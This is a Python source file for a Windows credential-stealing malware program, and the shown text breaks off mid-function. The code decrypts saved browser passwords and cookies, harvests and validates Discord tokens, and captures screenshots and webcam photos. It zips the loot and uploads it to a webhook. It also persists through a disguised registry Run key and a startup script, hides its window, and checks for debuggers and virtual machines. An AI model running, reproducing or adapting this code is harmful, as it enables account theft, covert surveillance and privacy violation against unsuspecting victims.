import os
if os.name != 'nt':
    exit()
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime
import zipfile
import shutil
import sqlite3
import tempfile
import glob
import ctypes
import winreg
import io
import numpy as np
import os
import sys
import time
import platform
import socket
import uuid
import ctypes
from ctypes import wintypes
import subprocess
import getpass
import locale
import psutil
import requests
from requests.exceptions import RequestException
import traceback


def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([('win32crypt', 'pypiwin32'), ('Crypto.Cipher', 'pycryptodome'), ('PIL', 'pillow'), ('cv2', 'opencv-python')])
import win32crypt
from Crypto.Cipher import AES
from PIL import ImageGrab
from PIL import Image
import cv2

LOCAL = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome': LOCAL + '\\Google\\Chrome\\User Data\\Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default'
}

def add_chrome_profiles():
    chrome_profiles = {}
    chrome_base = LOCAL + '\\Google\\Chrome\\User Data'
    edge_base = LOCAL + '\\Microsoft\\Edge\\User Data'
    brave_base = LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data'
    
    if os.path.exists(chrome_base):
        for profile in glob.glob(chrome_base + '\\Profile*'):
            profile_name = os.path.basename(profile)
            chrome_profiles[f'Chrome {profile_name}'] = profile
            
    if os.path.exists(edge_base):
        for profile in glob.glob(edge_base + '\\Profile*'):
            profile_name = os.path.basename(profile)
            chrome_profiles[f'Edge {profile_name}'] = profile
            
    if os.path.exists(brave_base):
        for profile in glob.glob(brave_base + '\\Profile*'):
            profile_name = os.path.basename(profile)
            chrome_profiles[f'Brave {profile_name}'] = profile
            
    return chrome_profiles

PATHS.update(add_chrome_profiles())

def getheaders(token=None):
    headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'}
    if token:
        headers.update({'Authorization': token})
    return headers

def gettokens(path):
    path += '\\Local Storage\\leveldb\\'
    tokens = []
    if not os.path.exists(path):
        return tokens
    
    # Missing implementation - needs to be added
    return tokens

def getkey(path):
    path_parts = path.split('\\')
    base_path = '\\'.join(path_parts[:-1]) if '\\Default' in path or '\\Profile' in path else path
    local_state_path = os.path.join(base_path, 'Local State')
    if not os.path.exists(local_state_path):
        return None
        
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.loads(f.read())
        key = local_state.get('os_crypt', {}).get('encrypted_key')
        if key:
            return key
    return None

def getip():
    try:
        with urllib.request.urlopen('https://api.ipify.org?format=json') as response:
            return json.loads(response.read().decode()).get('ip')
    except:
        return 'None'

def decrypt_password(password, key):
    try:
        if password[:3] != b'v10' and password[:3] != b'v11':
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
        
        # Need to implement AES decryption for v10/v11 passwords
        iv = password[3:15]
        encrypted_password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(encrypted_password)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
        
    except Exception as e:
        return f'[Password decryption error]: {str(e)}'

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        return img_bytes
    except Exception as e:
        print(f'Error occurred while taking screenshot: {str(e)}')
        return None

def take_webcam_photo():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print('Webcam could not be opened.')
            return None
            
        ret, frame = cap.read()
        if not ret:
            print('Could not get image from webcam.')
            cap.release()
            return None
            
        # Convert frame to PIL image and then to bytes
        img = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        img_pil = Image.fromarray(img)
        img_bytes = io.BytesIO()
        img_pil.save(img_bytes, format='JPEG')
        img_bytes.seek(0)
        
        cap.release()
        return img_bytes
        
    except Exception as e:
        print(f'Error occurred while taking webcam photo: {str(e)}')
        return None

def get_all_data():
    temp_dir = tempfile.mkdtemp()
    computer_name = os.environ.get('COMPUTERNAME') or os.environ.get('HOSTNAME') or 'Unknown'
    zip_file_path = os.path.join(temp_dir, f'{computer_name}.zip')
    log_file = os.path.join(temp_dir, 'data_log.txt')
    success_count = 0
    
    with open(log_file, 'w', encoding='utf-8') as log:
        log.write(f'Data collection started: {datetime.datetime.now()}\n')
        log.write('Scanned folders:\n')
        for browser, path in PATHS.items():
            log.write(f'{browser}: {path} - Exists: {os.path.exists(path)}\n')
    
    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipped_file:
        zipped_file.write(log_file, 'data_log.txt')
        
        # Add screenshot to zip if available
        try:
            screenshot_bytes = take_screenshot()
            if screenshot_bytes:
                screenshot_info = os.path.join(temp_dir, 'screenshot_info.txt')
                with open(screenshot_info, 'w', encoding='utf-8') as f:
                    f.write(f'Screenshot taken: {datetime.datetime.now()}\n')
                
                zipped_file.write(screenshot_info, 'screenshot/info.txt')
                zipped_file.writestr('screenshot/screenshot.png', screenshot_bytes.getvalue())
                
                with open(log_file, 'a', encoding='utf-8') as log:
                    log.write('\nScreenshot successfully taken and added to zip\n')
        except Exception as e:
            with open(log_file, 'a', encoding='utf-8') as log:
                log.write(f'\nError while taking screenshot: {str(e)}\n')
        
        # Add webcam photo to zip if available
        try:
            webcam_bytes = take_webcam_photo()
            if webcam_bytes:
                webcam_info = os.path.join(temp_dir, 'webcam_info.txt')
                with open(webcam_info, 'w', encoding='utf-8') as f:
                    f.write(f'Webcam photo taken: {datetime.datetime.now()}\n')
                
                zipped_file.write(webcam_info, 'webcam/info.txt')
                zipped_file.writestr('webcam/webcam.jpg', webcam_bytes.getvalue())
                
                with open(log_file, 'a', encoding='utf-8') as log:
                    log.write('\nWebcam photo successfully taken and added to zip\n')
        except Exception as e:
            with open(log_file, 'a', encoding='utf-8') as log:
                log.write(f'\nError while taking webcam photo: {str(e)}\n')
        
        # Add browser data to zip
        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue
                
            try:
                with open(log_file, 'a', encoding='utf-8') as log:
                    log.write(f'\nProcessing started for {platform}\n')
                
                encrypted_key = getkey(path)
                if not encrypted_key:
                    with open(log_file, 'a', encoding='utf-8') as log:
                        log.write(f'Encryption key not found for {platform}\n')
                    continue
                
                try:
                    key = win32crypt.CryptUnprotectData(base64.b64decode(encrypted_key)[5:], None, None, None, 0)[1]
                    with open(log_file, 'a', encoding='utf-8') as log:
                        log.write(f'Encryption key decrypted for {platform}\n')
                    
                    # Handle paths for profiles
                    passwords_path = path + '\\Login Data'
                    cookies_path = path + '\\Cookies'
                    
                    with open(log_file, 'a', encoding='utf-8') as log:
                        log.write(f'Password file path: {passwords_path} - Exists: {os.path.exists(passwords_path)}\n')
                        log.write(f'Cookies file path: {cookies_path} - Exists: {os.path.exists(cookies_path)}\n')
                    
                    # Process passwords
                    if os.path.exists(passwords_path):
                        try:
                            temp_passwords = os.path.join(temp_dir, f'{platform}_passwords.db')
                            shutil.copy2(passwords_path, temp_passwords)
                            passwords_file = os.path.join(temp_dir, f'{platform}_passwords.txt')
                            
                            with open(passwords_file, 'w', encoding='utf-8') as f:
                                conn = sqlite3.connect(temp_passwords)
                                cursor = conn.cursor()
                                
                                try:
                                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                                    password_count = 0
                                    
                                    for row in cursor.fetchall():
                                        url = row[0]
                                        username = row[1]
                                        encrypted_password = row[2]
                                        
                                        if url and username and encrypted_password:
                                            try:
                                                decrypted_password = decrypt_password(encrypted_password, key)
                                                f.write(f'URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n')
                                                password_count += 1
                                            except Exception as e:
                                                f.write(f'URL: {url}\nUsername: {username}\nPassword: [Could not decrypt] {str(e)}\n\n')
                                    
                                    with open(log_file, 'a', encoding='utf-8') as log:
                                        log.write(f'{platform} extracted {password_count} passwords\n')
                                    
                                    if password_count > 0:
                                        success_count += 1
                                        
                                except Exception as e:
                                    with open(log_file, 'a', encoding='utf-8') as log:
                                        log.write(f'Password database error for {platform}: {str(e)}\n')
                                    f.write(f'Could not retrieve password from database: {str(e)}')
                                
                                cursor.close()
                                conn.close()
                                zipped_file.write(passwords_file, f'browsers/{platform}/passwords.txt')
                                os.remove(passwords_file)
                                
                        except Exception as e:
                            with open(log_file, 'a', encoding='utf-8') as log:
                                log.write(f'Error processing passwords for {platform}: {str(e)}\n')
                    
                    # Process cookies
                    if os.path.exists(cookies_path):
                        try:
                            temp_cookies = os.path.join(temp_dir, f'{platform}_cookies.db')
                            shutil.copy2(cookies_path, temp_cookies)
                            cookies_file = os.path.join(temp_dir, f'{platform}_cookies.txt')
                            
                            with open(cookies_file, 'w', encoding='utf-8') as f:
                                conn = sqlite3.connect(temp_cookies)
                                cursor = conn.cursor()
                                
                                try:
                                    cursor.execute('SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies')
                                    cookie_count = 0
                                    
                                    for row in cursor.fetchall():
                                        host = row[0]
                                        name = row[1]
                                        encrypted_cookie = row[2]
                                        path = row[3]
                                        expires = row[4]
                                        secure = row[5]
                                        
                                        if host and name and encrypted_cookie:
                                            try:
                                                decrypted_cookie = decrypt_password(encrypted_cookie, key)
                                                f.write(f'Host: {host}\nName: {name}\nValue: {decrypted_cookie}\nPath: {path}\nExpires: {expires}\nSecure: {secure}\n\n')
                                                cookie_count += 1
                                            except Exception as e:
                                                f.write(f'Host: {host}\nName: {name}\nValue: [Could not decrypt] {str(e)}\nPath: {path}\nExpires: {expires}\nSecure: {secure}\n\n')
                                    
                                    with open(log_file, 'a', encoding='utf-8') as log:
                                        log.write(f'{platform} extracted {cookie_count} cookies\n')
                                    
                                    if cookie_count > 0:
                                        success_count += 1
                                        
                                except Exception as e:
                                    with open(log_file, 'a', encoding='utf-8') as log:
                                        log.write(f'Cookie database error for {platform}: {str(e)}\n')
                                    f.write(f'Could not retrieve cookie from database: {str(e)}')
                                
                                cursor.close()
                                conn.close()
                                zipped_file.write(cookies_file, f'browsers/{platform}/cookies.txt')
                                os.remove(cookies_file)
                                os.remove(temp_cookies)
                                
                        except Exception as e:
                            with open(log_file, 'a', encoding='utf-8') as log:
                                log.write(f'Error processing cookies for {platform}: {str(e)}\n')
                
                except Exception as e:
                    with open(log_file, 'a', encoding='utf-8') as log:
                        log.write(f'Could not decrypt encryption key for {platform}: {str(e)}\n')
                    continue
                    
            except Exception as e:
                with open(log_file, 'a', encoding='utf-8') as log:
                    log.write(f'Unexpected error for {platform}: {str(e)}\n')
        
        with open(log_file, 'a', encoding='utf-8') as log:
            log.write(f'\nTotal successful data collected from browser: {success_count}\n')
            log.write(f'Process completed: {datetime.datetime.now()}\n')
    
    return (zip_file_path, success_count)

def send_data_with_embed(webhook_url, zip_file_path, embed_data):
    try:
        boundary = '----WebKitFormBoundary' + ''.join(['abcdef'[i % 6] for i in range(16)])
        form_data = []
        form_data.append(f'--{boundary}'.encode())
        form_data.append('Content-Disposition: form-data; name=\"payload_json\"'.encode())
        form_data.append('Content-Type: application/json'.encode())
        form_data.append(''.encode())
        form_data.append(json.dumps(embed_data).encode())
        form_data.append(f'--{boundary}'.encode())
        computer_name = os.environ.get('COMPUTERNAME') or os.environ.get('HOSTNAME') or 'Unknown'
        form_data.append(f'Content-Disposition: form-data; name=\"file\"; filename=\"{computer_name}.zip\"'.encode())
        form_data.append('Content-Type: application/zip'.encode())
        form_data.append(''.encode())
        
        with open(zip_file_path, 'rb') as f:
            form_data.append(f.read())
        
        form_data.append(f'--{boundary}--'.encode())
        request = urllib.request.Request(webhook_url)
        request.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36')
        data = b'\r\n'.join(form_data)
        request.add_header('Content-Length', len(data))
        
        with urllib.request.urlopen(request, data=data) as response:
            success = response.status == 200
        
        # Clean up
        temp_dir = os.path.dirname(zip_file_path)
        for file in os.listdir(temp_dir):
            try:
                os.remove(os.path.join(temp_dir, file))
            except:
                pass
        try:
            os.rmdir(temp_dir)
        except:
            pass
            
        return success
        
    except Exception as e:
        print(f'Error occurred while sending data to webhook: {str(e)}')
        
        # Clean up on error
        if os.path.exists(zip_file_path):
            temp_dir = os.path.dirname(zip_file_path)
            for file in os.listdir(temp_dir):
                try:
                    os.remove(os.path.join(temp_dir, file))
                except:
                    pass
            try:
                os.rmdir(temp_dir)
            except:
                pass
                
        return False

def add_to_startup():
    try:
        executable_path = os.path.abspath(sys.argv[0])
        startup_command = ""
        
        if executable_path.endswith('.py'):
            startup_command = f'pythonw.exe \"{executable_path}\"'
            try:
                appdata_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'system32.exe')
                shutil.copy2(executable_path, appdata_path)
                executable_path = appdata_path
                startup_command = f'\"{executable_path}\"'
            except:
                pass
        else:
            startup_command = f'\"{executable_path}\"'
            
        # Add to registry
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'msservice', 0, winreg.REG_SZ, startup_command)
        winreg.CloseKey(key)
        
        # Add to startup folder
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if os.path.exists(startup_folder):
            startup_file = os.path.join(startup_folder, 'msservice.bat')
            with open(startup_file, 'w') as f:
                f.write(f'@echo off\nstart \"\" {startup_command}\nexit')
                
        return True
        
    except Exception as e:
        print(f'Error adding to startup: {str(e)}')
        return False

def run_in_background():
    try:
        if sys.executable.lower().endswith('python.exe') and sys.argv[0].endswith('.py'):
            subprocess.Popen(
                [sys.executable.replace('python.exe', 'pythonw.exe')] + sys.argv, 
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
            )
            sys.exit(0)
            
        if hasattr(ctypes, 'windll'):
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            
        return True
        
    except Exception as e:
        print(f'Error running in background: {str(e)}')
        return False

def get_discord_user_data_by_id(user_id):
    try:
        # Get detailed user data
        lookup_url = f'https://discordlookup.mesalytic.moe/v1/user/{user_id}'
        req = urllib.request.Request(lookup_url)
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36')
        
        with urllib.request.urlopen(req) as response:
            user_data = json.loads(response.read().decode())
            
            if not user_data or 'raw' not in user_data:
                return None
                
            raw_data = user_data.get('raw', {})
            user_info = {
                'id': raw_data.get('id'),
                'username': raw_data.get('username'),
                'avatar': raw_data.get('avatar'),
                'banner': raw_data.get('banner'),
                'tag': raw_data.get('clan', {}).get('tag')
            }
            
            return user_info
    except Exception as e:
        print(f"Error getting Discord user data: {str(e)}")
        return None

def get_discord_localstorage_tokens():
    tokens = []
    for platform, path in PATHS.items():
        local_storage_path = os.path.join(path, 'Local Storage', 'leveldb')
        if not os.path.exists(local_storage_path):
            continue
        for file_name in os.listdir(local_storage_path):
            if not file_name.endswith('.ldb') and not file_name.endswith('.log'):
                continue
            try:
                with open(os.path.join(local_storage_path, file_name), 'rb') as file:
                    content = file.read().decode('utf-8', errors='ignore')
                    # Search for "token":"TOKEN_VALUE" format
                    for match in re.finditer(r'\"token\"\\s*:\\s*\"([^\"]+)\"', content):
                        token = match.group(1)
                        if token not in tokens:
                            tokens.append(token)
            except Exception:
                continue
    return tokens

def get_discord_id_from_token(token):
    try:
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
        }
        
        # Try to get user ID from token directly
        try:
            # Token format: base64(user_id).xxx.xxx for regular tokens
            if token.startswith('mfa.'):
                # For MFA tokens, need to use API
                req = urllib.request.Request('https://discord.com/api/v9/users/@me', headers=headers)
                with urllib.request.urlopen(req) as response:
                    me_data = json.loads(response.read().decode())
                    return me_data.get('id')
            else:
                user_id_part = token.split('.')[0]
                # Add padding if needed
                user_id_part += '=' * (4 - len(user_id_part) % 4)
                user_id = base64.b64decode(user_id_part).decode('utf-8')
                return user_id
        except Exception as e:
            print(f"Error extracting ID from token: {str(e)}")
            
            # Fallback: try API
            try:
                req = urllib.request.Request('https://discord.com/api/v9/users/@me', headers=headers)
                with urllib.request.urlopen(req) as response:
                    me_data = json.loads(response.read().decode())
                    return me_data.get('id')
            except Exception as api_e:
                print(f"API fallback error: {str(api_e)}")
                return None
    except Exception as e:
        print(f"General error getting user ID: {str(e)}")
        return None

def get_discord_id_direct():
    """Attempts to get the user ID directly from Discord data"""
    try:
        # Discord folders
        discord_paths = [
            os.path.join(ROAMING, 'discord'),
            os.path.join(ROAMING, 'discordcanary'),
            os.path.join(ROAMING, 'discordptb')
        ]
        
        for discord_path in discord_paths:
            if not os.path.exists(discord_path):
                continue
                
            # Method 1: Get ID from settings.json
            settings_path = os.path.join(discord_path, 'settings.json')
            if os.path.exists(settings_path):
                try:
                    with open(settings_path, 'r', encoding='utf-8') as f:
                        settings = json.load(f)
                        if settings.get('userData', {}).get('id'):
                            return settings['userData']['id']
                except:
                    pass
            
            # Method 2: Get ID from session storage
            local_storage_path = os.path.join(discord_path, 'Local Storage', 'leveldb')
            if os.path.exists(local_storage_path):
                for file_name in os.listdir(local_storage_path):
                    if file_name.endswith('.ldb') or file_name.endswith('.log'):
                        try:
                            with open(os.path.join(local_storage_path, file_name), 'rb') as f:
                                content = f.read().decode('utf-8', errors='ignore')
                                # ID pattern for user data in leveldb
                                id_pattern = r'"user_id_cache":"(\d+)"'
                                matches = re.findall(id_pattern, content)
                                if matches:
                                    return matches[0]
                                
                                # Alternative pattern
                                alt_pattern = r'\"(\d{17,19})\"'
                                matches = re.findall(alt_pattern, content)
                                for match in matches:
                                    if len(match) >= 17 and len(match) <= 19:
                                        # Validation: Discord IDs are usually 17-19 digits long
                                        return match
                        except:
                            pass
            
            # Method 3: Check cache folders
            cache_path = os.path.join(discord_path, 'Cache')
            if os.path.exists(cache_path):
                for file_name in os.listdir(cache_path):
                    try:
                        if not file_name.startswith('f_'):
                            continue
                        with open(os.path.join(cache_path, file_name), 'rb') as f:
                            content = f.read().decode('utf-8', errors='ignore')
                            
                            # Search for ID
                            id_pattern = r'"id"\s*:\s*"(\d{17,20})"'
                            id_matches = re.findall(id_pattern, content)
                            if id_matches:
                                return id_matches[0]
                    except:
                        pass
        
        return None
    except Exception as e:
        print(f"Error getting Discord ID directly: {str(e)}")
        return None

def get_discord_users_data():
    """Collects Discord user information"""
    # First, try to get the ID directly
    direct_id = get_discord_id_direct()
    if direct_id:
        user_data = get_discord_user_data_by_id(direct_id)
        if user_data:
            return user_data
    
    # If the ID could not be obtained directly, try the token method
    tokens = get_discord_localstorage_tokens()
    if not tokens:
        print("No Discord tokens found")
        return None
        
    for token in tokens:
        user_id = get_discord_id_from_token(token)
        if user_id:
            # Found a valid user ID, now get the data
            user_data = get_discord_user_data_by_id(user_id)
            if user_data:
                return user_data
    
    return None

def extract_discord_info():
    """Extracts Discord information directly from databases associated with the exe file"""
    try:
        # Find the last folder Discord was running in
        discord_process_paths = []
        
        # Discord folders - scan all possible locations
        possible_paths = [
            os.path.join(LOCAL, 'Discord'),
            os.path.join(ROAMING, 'Discord'),
            os.path.join(LOCAL, 'DiscordCanary'),
            os.path.join(ROAMING, 'DiscordCanary'),
            os.path.join(LOCAL, 'DiscordPTB'),
            os.path.join(ROAMING, 'DiscordPTB'),
            os.path.join(LOCAL, 'DiscordDevelopment'),
            os.path.join(ROAMING, 'DiscordDevelopment'),
            os.path.join('C:\\', 'Program Files', 'Discord'),
            os.path.join('C:\\', 'Program Files (x86)', 'Discord')
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                discord_process_paths.append(path)
        
        if not discord_process_paths:
            print("Discord installation not found")
            return None
        
        # Scan Discord's leveldb files - this is where token and user ID information is stored
        token = None
        user_id = None
        
        for discord_path in discord_process_paths:
            # Method 1: Scan Discord's Local Storage leveldb
            leveldb_paths = [
                os.path.join(discord_path, 'Local Storage', 'leveldb'),
                os.path.join(discord_path, 'Local Storage', 'level-0'),
                os.path.join(discord_path, 'Local Storage', 'level-1'),
            ]
            
            for leveldb_path in leveldb_paths:
                if not os.path.exists(leveldb_path):
                    continue
                    
                for file_name in os.listdir(leveldb_path):
                    if not file_name.endswith('.ldb') and not file_name.endswith('.log'):
                        continue
                        
                    file_path = os.path.join(leveldb_path, file_name)
                    try:
                        # Read binary - may contain more information
                        with open(file_path, 'rb') as f:
                            content = f.read()
                            
                            # Decode to extract information
                            text_content = content.decode('utf-8', errors='ignore')
                            
                            # Token pattern
                            token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}'
                            token_matches = re.findall(token_pattern, text_content)
                            if token_matches:
                                token = token_matches[0]
                            
                            # ID pattern - covering different formats
                            id_patterns = [
                                r'"user_id_cache":"(\d{17,20})"',  # user_id_cache format
                                r'"id":"(\d{17,20})"',              # JSON id format
                                r'"user_id":"(\d{17,20})"',         # user_id format
                                r'\"id\"\s*:\s*\"(\d{17,20})\"',    # id : "123" format
                                r'\"userId\"\s*:\s*\"(\d{17,20})\"',# userId : "123" format
                                r'\"discord_id\"\s*:\s*\"(\d{17,20})\"' # discord_id : "123" format
                            ]
                            
                            for pattern in id_patterns:
                                id_matches = re.findall(pattern, text_content)
                                if id_matches:
                                    user_id = id_matches[0]
                                    break
                                    
                            # If both token and ID are found, exit the loop
                            if token and user_id:
                                break
                    except Exception as e:
                        print(f"File read error: {str(e)}")
                
                # If both token and ID are found, exit the loop
                if token and user_id:
                    break
                    
            # Method 2: Check the network folder - HTTP requests are cached here
            network_path = os.path.join(discord_path, 'Network')
            if os.path.exists(network_path) and not user_id:
                for file_name in os.listdir(network_path):
                    try:
                        file_path = os.path.join(network_path, file_name)
                        if os.path.isfile(file_path):
                            with open(file_path, 'rb') as f:
                                content = f.read().decode('utf-8', errors='ignore')
                                
                                # Search for ID
                                for pattern in id_patterns:
                                    id_matches = re.findall(pattern, content)
                                    if id_matches:
                                        user_id = id_matches[0]
                                        break
                                        
                                # If ID is found, exit the loop
                                if user_id:
                                    break
                    except:
                        pass
            
            # Method 3: Scan the cache folder - API responses are usually stored here
            cache_path = os.path.join(discord_path, 'Cache')
            if os.path.exists(cache_path) and not user_id:
                for file_name in os.listdir(cache_path):
                    try:
                        if file_name.startswith('f_'):
                            file_path = os.path.join(cache_path, file_name)
                            with open(file_path, 'rb') as f:
                                content = f.read().decode('utf-8', errors='ignore')
                                
                                # Search for ID
                                id_pattern = r'"id"\s*:\s*"(\d{17,20})"'
                                id_matches = re.findall(id_pattern, content)
                                if id_matches:
                                    user_id = id_matches[0]
                                    break
                    except:
                        pass
            
            # If the ID could be found from this Discord version, stop looking in others
            if user_id:
                break
        
        # If the ID could be found, get user information from Discord API
        if user_id:
            return get_discord_user_data_by_id(user_id)
            
        return None
    except Exception as e:
        print(f"Discord info extraction error: {str(e)}")
        return None

def get_discord_tokens_from_localstorage():
    tokens = []
    for platform, path in PATHS.items():
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        if not os.path.exists(leveldb_path):
            continue
        key_path = os.path.join(path, "Local State")
        if not os.path.exists(key_path):
            continue
        try:
            with open(key_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception:
            continue

        for file_name in os.listdir(leveldb_path):
            if not (file_name.endswith(".ldb") or file_name.endswith(".log")):
                continue
            try:
                with open(os.path.join(leveldb_path, file_name), "r", errors="ignore") as f:
                    for line in f:
                        for enc_token in re.findall(r'dQw4w9WgXcQ:[^\"]+', line):
                            try:
                                enc_token = enc_token.split("dQw4w9WgXcQ:")[1]
                                data = base64.b64decode(enc_token)
                                iv = data[3:15]
                                payload = data[15:]
                                cipher = AES.new(key, AES.MODE_GCM, iv)
                                decrypted = cipher.decrypt(payload)[:-16].decode()
                                if decrypted not in tokens:
                                    tokens.append(decrypted)
                            except Exception:
                                continue
            except Exception:
                continue
    return tokens

def get_tokens_from_leveldb():
    tokens = []
    
    # Discord file paths
    roaming = os.getenv('APPDATA')
    local = os.getenv('LOCALAPPDATA')
    
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
    }
    
    # Regex patterns for tokens
    regex_patterns = [
        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',  # Normal token pattern
        r'mfa\.[\w-]{84}'                    # MFA token pattern
    ]
    
    # Search for tokens in browsers' Local Storage folders
    for _, path in paths.items():
        if not os.path.exists(path):
            continue
        
        leveldb_path = path + '\\Local Storage\\leveldb'
        if not os.path.exists(leveldb_path):
            continue
        
        # Scan LevelDB files
        try:
            for file_name in os.listdir(leveldb_path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                
                try:
                    with open(f'{leveldb_path}\\{file_name}', errors='ignore') as f:
                        for line in [x.strip() for x in f.readlines() if x.strip()]:
                            for regex in regex_patterns:
                                for token in re.findall(regex, line):
                                    if token not in tokens:
                                        tokens.append(token)
                except Exception:
                    continue
        except Exception:
            continue
    
    # Validate found tokens and return only valid ones
    valid_tokens = []
    for token in tokens:
        try:
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
            }
            
            req = urllib.request.Request('https://discord.com/api/v9/users/@me', headers=headers)
            with urllib.request.urlopen(req) as response:
                if response.getcode() == 200:
                    valid_tokens.append(token)
        except Exception:
            continue
    
    return valid_tokens

def is_debugger_present():
    """Checks for the presence of a debugger"""
    try:
        if platform.system() == "Windows":
            # Use IsDebuggerPresent API
            return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        elif platform.system() == "Linux":
            # Check TracerPid in Linux
            with open("/proc/self/status", "r") as f:
                for line in f:
                    if "TracerPid" in line:
                        return int(line.split(":")[-1].strip()) != 0
        return False
    except:
        return False

def is_running_in_vm():
    """Checks if running in a VM"""
    vm_detected = False
    
    # Check VM MAC address
    vm_mac_prefixes = ['00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '08:00:27', '00:16:3e']
    try:
        # Get MAC address
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        # Check VM MAC address prefixes
        for prefix in vm_mac_prefixes:
            if mac.lower().startswith(prefix.lower()):
                vm_detected = True
                break
    except:
        pass
    
    # Check VM names
    vm_names = ["virtualbox", "vmware", "kvm", "qemu", "xen", "bochs", "parallels", "hyperv", "virtual"]
    try:
        # Check computer name
        computer_name = platform.node().lower()
        for name in vm_names:
            if name in computer_name:
                vm_detected = True
                break
        
        # Check BIOS or motherboard information on Windows
        if platform.system() == "Windows":
            try:
                manufacturer = subprocess.check_output("wmic baseboard get Manufacturer", shell=True).decode().lower()
                for vm in vm_names:
                    if vm in manufacturer:
                        vm_detected = True
                        break
                    
                product = subprocess.check_output("wmic computersystem get model", shell=True).decode().lower()
                for vm in vm_names:
                    if vm in product:
                        vm_detected = True
                        break
            except:
                pass
    except:
        pass
    
    # Check for VM tools like VMware Tools or VirtualBox Guest Additions
    vm_processes = [
        "vmtoolsd.exe", "vboxtray.exe", "vboxservice.exe", "vmacthlp.exe", "vmsrvc.exe",
        "vmwareuser.exe", "vmwaretray.exe", "xenservice.exe", "prl_tools.exe"
    ]
    try:
        if platform.system() == "Windows":
            # Windows tasklist command
